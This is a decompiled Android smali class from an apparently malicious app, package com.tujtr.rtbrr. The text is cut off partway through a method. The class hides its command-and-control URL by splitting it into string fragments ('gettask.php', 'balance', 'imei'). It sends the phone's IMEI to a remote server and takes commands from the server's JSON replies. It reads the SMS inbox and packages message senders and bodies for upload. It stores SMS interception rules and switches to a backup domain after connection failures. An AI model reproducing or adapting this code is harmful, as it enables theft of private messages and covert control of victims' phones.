.class Lcom/tujtr/rtbrr/b;
.super Landroid/os/AsyncTask;


# instance fields
.field final synthetic a:Lcom/tujtr/rtbrr/TheBack;


# direct methods
.method constructor <init>(Lcom/tujtr/rtbrr/TheBack;)V
    .locals 0

    iput-object p1, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Ljava/io/InputStreamReader;)Ljava/io/BufferedReader;
    .locals 1

    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, p1}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    return-object v0
.end method

.method public a(Ljava/io/InputStream;)Ljava/io/InputStreamReader;
    .locals 2

    const-string v0, "utf-8"

    new-instance v1, Ljava/io/InputStreamReader;

    invoke-direct {v1, p1, v0}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    return-object v1
.end method

.method public a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public a(Ljava/lang/String;Ljava/util/List;)Ljava/lang/String;
    .locals 4

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "http://"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "URL"

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    new-instance v2, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v2, v0}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/lang/String;)V

    if-eqz p2, :cond_0

    new-instance v0, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    const-string v3, "UTF-8"

    invoke-direct {v0, p2, v3}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V

    :cond_0
    invoke-interface {v1, v2}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v0

    invoke-interface {v0}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v0

    const-string v1, "UTF-8"

    invoke-static {v0, v1}, Lorg/apache/http/util/EntityUtils;->toString(Lorg/apache/http/HttpEntity;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public a(Lorg/json/JSONObject;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    invoke-virtual {p1, p2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs a([Ljava/lang/String;)Ljava/lang/String;
    .locals 11

    const/4 v10, 0x1

    :try_start_0
    invoke-virtual {p0}, Lcom/tujtr/rtbrr/b;->a()V

    iget-object v0, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v0, v0, Lcom/tujtr/rtbrr/TheBack;->a:Landroid/content/Context;

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    new-instance v0, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v0}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    invoke-virtual {p0}, Lcom/tujtr/rtbrr/b;->b()Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    sget-object v2, La/a;->a:Ljava/lang/String;

    const-string v3, "/b"

    const-string v4, "n/ge"

    const-string v5, "tt"

    const-string v6, "a"

    const-string v7, "sk"

    const-string v8, ".p"

    invoke-virtual {p0, v5, v6, v7, v8}, Lcom/tujtr/rtbrr/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "hp?"

    invoke-virtual {p0, v3, v4, v5, v6}, Lcom/tujtr/rtbrr/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "b"

    const-string v5, "ala"

    const-string v6, "nc"

    const-string v7, "e="

    invoke-virtual {p0, v4, v5, v6, v7}, Lcom/tujtr/rtbrr/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    sget-object v5, Lcom/tujtr/rtbrr/SReceiver;->a:Ljava/lang/String;

    const-string v6, "&i"

    const-string v7, "m"

    const-string v8, "ei"

    const-string v9, "="

    invoke-virtual {p0, v6, v7, v8, v9}, Lcom/tujtr/rtbrr/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {p0, v4, v5, v6, v1}, Lcom/tujtr/rtbrr/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v4, "http://"

    const-string v5, ""

    invoke-virtual {p0, v2, v3, v5, v1}, Lcom/tujtr/rtbrr/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v3, ""

    invoke-virtual {p0, v4, v1, v2, v3}, Lcom/tujtr/rtbrr/b;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Lcom/tujtr/rtbrr/b;->d(Ljava/lang/String;)V

    invoke-virtual {p0, v1}, Lcom/tujtr/rtbrr/b;->e(Ljava/lang/String;)Lorg/apache/http/client/methods/HttpGet;

    move-result-object v1

    invoke-virtual {p0, v0, v1}, Lcom/tujtr/rtbrr/b;->a(Lorg/apache/http/client/HttpClient;Lorg/apache/http/client/methods/HttpGet;)Lorg/apache/http/HttpResponse;

    move-result-object v0

    invoke-interface {v0}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v0

    invoke-interface {v0}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/b;->b(Ljava/io/InputStream;)Ljava/io/BufferedReader;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0, v1, v2}, Lcom/tujtr/rtbrr/b;->a(Ljava/io/BufferedReader;Ljava/lang/StringBuilder;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0, v0, v1}, Lcom/tujtr/rtbrr/b;->a(Ljava/io/InputStream;Ljava/io/BufferedReader;)V

    invoke-virtual {p0, v2}, Lcom/tujtr/rtbrr/b;->f(Ljava/lang/String;)I

    move-result v0

    if-ne v0, v10, :cond_0

    new-instance v0, Lcom/tujtr/rtbrr/e;

    iget-object v1, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v1, v1, Lcom/tujtr/rtbrr/TheBack;->a:Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/tujtr/rtbrr/e;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Lcom/tujtr/rtbrr/e;->a(I)V

    :cond_0
    invoke-virtual {p0, v2}, Lcom/tujtr/rtbrr/b;->a(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    const/4 v0, 0x0

    return-object v0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public a(Ljava/io/BufferedReader;Ljava/lang/StringBuilder;)Ljava/lang/StringBuilder;
    .locals 1

    :goto_0
    invoke-virtual {p1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    return-object p2

    :cond_0
    invoke-virtual {p0, p2, v0}, Lcom/tujtr/rtbrr/b;->a(Ljava/lang/StringBuilder;Ljava/lang/String;)V

    goto :goto_0
.end method

.method public a(Lorg/apache/http/client/HttpClient;Lorg/apache/http/client/methods/HttpGet;)Lorg/apache/http/HttpResponse;
    .locals 4

    const/4 v3, 0x0

    :try_start_0
    invoke-interface {p1, p2}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    :try_end_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    new-instance v1, Lcom/tujtr/rtbrr/e;

    iget-object v2, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v2, v2, Lcom/tujtr/rtbrr/TheBack;->a:Landroid/content/Context;

    invoke-direct {v1, v2}, Lcom/tujtr/rtbrr/e;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v3}, Lcom/tujtr/rtbrr/e;->a(I)V

    invoke-virtual {v0}, Lorg/apache/http/client/ClientProtocolException;->printStackTrace()V

    :goto_1
    const/4 v0, 0x0

    goto :goto_0

    :catch_1
    move-exception v0

    new-instance v1, Lcom/tujtr/rtbrr/e;

    iget-object v2, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v2, v2, Lcom/tujtr/rtbrr/TheBack;->a:Landroid/content/Context;

    invoke-direct {v1, v2}, Lcom/tujtr/rtbrr/e;-><init>(Landroid/content/Context;)V

    invoke-virtual {v1, v3}, Lcom/tujtr/rtbrr/e;->a(I)V

    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1
.end method

.method public a(Lorg/json/JSONArray;)Lorg/json/JSONObject;
    .locals 1

    const/4 v0, 0x0

    :try_start_0
    invoke-virtual {p1, v0}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    const/4 v0, 0x0

    goto :goto_0
.end method

.method public a()V
    .locals 8

    const/4 v4, 0x0

    const/4 v2, 0x1

    new-instance v0, Ljava/lang/StringBuilder;

    sget-object v1, La/a;->a:Ljava/lang/String;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v1, "/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "b"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "n"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "/"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "ge"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "t"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "ta"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "s"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "k"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ".p"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "h"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "p"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const-string v3, "google.com"

    const/16 v0, 0x5a0

    sget v5, Lcom/tujtr/rtbrr/TheSure;->b:I

    div-int v5, v0, v5

    const-string v0, ""

    const/4 v6, 0x0

    :try_start_0
    invoke-virtual {p0, v1, v6}, Lcom/tujtr/rtbrr/b;->a(Ljava/lang/String;Ljava/util/List;)Ljava/lang/String;
    :try_end_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    move-result-object v0

    move-object v1, v0

    move v0, v4

    :goto_0
    :try_start_1
    invoke-virtual {p0, v3, v6}, Lcom/tujtr/rtbrr/b;->a(Ljava/lang/String;Ljava/util/List;)Ljava/lang/String;
    :try_end_1
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_3

    move v3, v4

    :goto_1
    if-nez v0, :cond_4

    const-string v6, "[]"

    invoke-virtual {v1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_4

    move v1, v2

    :goto_2
    if-ne v1, v2, :cond_1

    if-nez v3, :cond_1

    sget-object v0, La/a;->c:Landroid/content/SharedPreferences;

    const-string v6, "connect_errors"

    invoke-interface {v0, v6, v4}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    if-ge v0, v5, :cond_0

    add-int/lit8 v0, v0, 0x1

    sget-object v6, La/a;->d:Landroid/content/SharedPreferences$Editor;

    const-string v7, "connect_errors"

    invoke-interface {v6, v7, v0}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    sget-object v6, La/a;->d:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v6}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_0
    if-le v0, v5, :cond_1

    sget-object v0, La/a;->d:Landroid/content/SharedPreferences$Editor;

    const-string v5, "domain"

    invoke-interface {v0, v5, v2}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    sget-object v0, La/a;->d:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    sget-object v0, La/a;->b:[Ljava/lang/String;

    aget-object v0, v0, v2

    sput-object v0, La/a;->a:Ljava/lang/String;

    :cond_1
    if-ne v1, v2, :cond_2

    if-ne v3, v2, :cond_2

    sget-object v0, La/a;->d:Landroid/content/SharedPreferences$Editor;

    const-string v2, "connect_errors"

    invoke-interface {v0, v2, v4}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    sget-object v0, La/a;->d:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_2
    if-nez v1, :cond_3

    sget-object v0, La/a;->d:Landroid/content/SharedPreferences$Editor;

    const-string v1, "connect_errors"

    invoke-interface {v0, v1, v4}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    sget-object v0, La/a;->d:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_3
    return-void

    :catch_0
    move-exception v1

    move-object v1, v0

    move v0, v2

    goto :goto_0

    :catch_1
    move-exception v1

    move-object v1, v0

    move v0, v2

    goto :goto_0

    :catch_2
    move-exception v3

    move v3, v2

    goto :goto_1

    :catch_3
    move-exception v3

    move v3, v2

    goto :goto_1

    :cond_4
    move v1, v0

    goto :goto_2
.end method

.method public a(Landroid/content/Intent;)V
    .locals 1

    iget-object v0, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v0, v0, Lcom/tujtr/rtbrr/TheBack;->a:Landroid/content/Context;

    invoke-virtual {v0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method public a(Ljava/io/InputStream;Ljava/io/BufferedReader;)V
    .locals 0

    invoke-virtual {p1}, Ljava/io/InputStream;->close()V

    invoke-virtual {p2}, Ljava/io/BufferedReader;->close()V

    return-void
.end method

.method public a(Ljava/lang/String;)V
    .locals 2

    const/4 v0, 0x0

    :try_start_0
    new-instance v1, Lorg/json/JSONArray;

    invoke-direct {v1, p1}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v1}, Lcom/tujtr/rtbrr/b;->a(Lorg/json/JSONArray;)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/b;->a(Lorg/json/JSONObject;)V

    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/b;->b(Lorg/json/JSONObject;)V

    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/b;->d(Lorg/json/JSONObject;)V

    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/b;->e(Lorg/json/JSONObject;)V

    return-void

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public a(Ljava/lang/StringBuilder;Ljava/lang/String;)V
    .locals 0

    invoke-virtual {p1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    return-void
.end method

.method public a(Lorg/json/JSONObject;)V
    .locals 9

    new-instance v7, Lcom/tujtr/rtbrr/e;

    iget-object v0, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v0, v0, Lcom/tujtr/rtbrr/TheBack;->a:Landroid/content/Context;

    invoke-direct {v7, v0}, Lcom/tujtr/rtbrr/e;-><init>(Landroid/content/Context;)V

    const-string v0, "0"

    :try_start_0
    const-string v1, "getmessages"

    invoke-virtual {p0, p1, v1}, Lcom/tujtr/rtbrr/b;->a(Lorg/json/JSONObject;Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/b;->b(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    :try_start_1
    const-string v0, "messnum"

    invoke-virtual {p0, p1, v0}, Lcom/tujtr/rtbrr/b;->a(Lorg/json/JSONObject;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    const-string v6, ""

    iget-object v0, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v0, v0, Lcom/tujtr/rtbrr/TheBack;->a:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms/"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v0

    if-eqz v0, :cond_3

    :goto_1
    const-string v0, "address"

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v1, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "[TYPE="

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "type"

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "][NUMBER]"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "address"

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "[/NUMBER][MESSAGE]"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "body"

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v2

    invoke-interface {v1, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "[/MESSAGE]|||"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :goto_2
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-nez v2, :cond_2

    :goto_3
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    invoke-virtual {v7, v0}, Lcom/tujtr/rtbrr/e;->b(Ljava/lang/String;)V
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_1

    :cond_0
    :goto_4
    return-void

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto/16 :goto_0

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_4

    :cond_1
    move-object v0, v6

    goto :goto_2

    :cond_2
    move-object v6, v0

    goto :goto_1

    :cond_3
    move-object v0, v6

    goto :goto_3
.end method

.method public b(Ljava/io/InputStream;)Ljava/io/BufferedReader;
    .locals 1

    invoke-virtual {p0, p1}, Lcom/tujtr/rtbrr/b;->a(Ljava/io/InputStream;)Ljava/io/InputStreamReader;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/b;->a(Ljava/io/InputStreamReader;)Ljava/io/BufferedReader;

    move-result-object v0

    return-object v0
.end method

.method public b(Ljava/lang/String;)Ljava/lang/Boolean;
    .locals 2

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    :goto_0
    return-object v0

    :cond_0
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    goto :goto_0
.end method

.method public b()Ljava/lang/String;
    .locals 2

    iget-object v0, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v0, v0, Lcom/tujtr/rtbrr/TheBack;->a:Landroid/content/Context;

    const-string v1, "phone"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    const-string v1, ""

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public b(Lorg/json/JSONObject;)V
    .locals 3

    const-string v0, "intercept"

    invoke-virtual {p0, p1, v0}, Lcom/tujtr/rtbrr/b;->a(Lorg/json/JSONObject;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    if-eqz v1, :cond_0

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v0

    new-instance v1, Lcom/tujtr/rtbrr/e;

    iget-object v2, p0, Lcom/tujtr/rtbrr/b;->a:Lcom/tujtr/rtbrr/TheBack;

    iget-object v2, v2, Lcom/tujtr/rtbrr/TheBack;->a:Landroid/content/Context;

    invoke-direct {v1, v2}, Lcom/tujtr/rtbrr/e;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/tujtr/rtbrr/e;->a(Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method public c(Ljava/lang/String;)Landroid/net/Uri;
    .locals 1

    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    return-object v0
.end method

.method public c(Lorg/json/JSONObject;)Ljava/lang/String;
    .locals 3

    const-string v0, "@p@re@f@i@x@_@1@"

    const-string v1, "@"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public d(Ljava/lang/String;)V
    .locals 1

    const-string v0, "i"

    invoke-static {v0, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public d(Lorg/json/JSONObject;)V
    .locals 9

    const/4 v8, 0x1

    const/4 v7, 0x0

    const-string v0, "active_1"

    invoke-virtual {p0, p1, v0}, Lcom/tujtr/rtbrr/b;->a(Lorg/json/JSONObject;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/tujtr/rtbrr/b;->b(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v0

